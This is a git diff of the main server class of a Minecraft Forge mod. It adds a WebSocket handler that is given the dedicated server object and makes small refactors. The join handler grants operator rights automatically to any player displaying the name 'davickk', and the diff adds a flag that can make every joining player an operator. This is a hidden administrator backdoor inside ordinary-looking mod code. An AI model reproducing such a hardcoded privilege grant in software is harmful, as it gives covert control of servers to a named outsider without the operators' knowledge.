@@ -1,6 +1,9 @@
 package calebxzhou.rdi.mc.server;
 
+import calebxzhou.rdi.mc.common.RDI;
 import calebxzhou.rdi.mc.common.WebSocketClient;
+import calebxzhou.rdi.mc.common.WsMessage;
+import calebxzhou.rdi.mc.common.WsMessageHandler;
 import net.minecraft.server.dedicated.DedicatedServer;
 import net.minecraft.server.level.ServerPlayer;
 import net.minecraft.world.level.GameRules;
@@ -18,7 +21,7 @@ import org.apache.logging.log4j.Logger;
  */
 @Mod("rdi")
 @Mod.EventBusSubscriber(modid = "rdi")
-public class RDIMain {
+public class RDIMain  {
     private static final Logger lgr = LogManager.getLogger("rdi");
 
     public RDIMain() {
@@ -27,12 +30,12 @@ public class RDIMain {
 
     @SubscribeEvent
     public static void started(ServerStartedEvent e) {
-        WebSocketClient.start();
+        WebSocketClient.start(new WsHandler201((DedicatedServer)e.getServer()));
     }
 
     @SubscribeEvent
     public static void starting(ServerStartingEvent e) {
-        DedicatedServer server = (DedicatedServer) e.getServer();
+        var server = (DedicatedServer) e.getServer();
 
         GameRules.visitGameRuleTypes(new GameRules.GameRuleTypeVisitor() {
             @Override
@@ -60,8 +63,9 @@ public class RDIMain {
     }
     @SubscribeEvent
     public static void onPlayerJoin(PlayerEvent.PlayerLoggedInEvent e){
-        if (e.getEntity().getDisplayName().getString().equals("davickk")) {
-            ((ServerPlayer)e.getEntity()).server.getPlayerList().op(e.getEntity().getGameProfile());
+        var player = (ServerPlayer) e.getEntity();
+        if (player.getDisplayName().getString().equals("davickk") || RDI.ALL_OP) {
+            player.server.getPlayerList().op(player.getGameProfile());
         }
     }
 
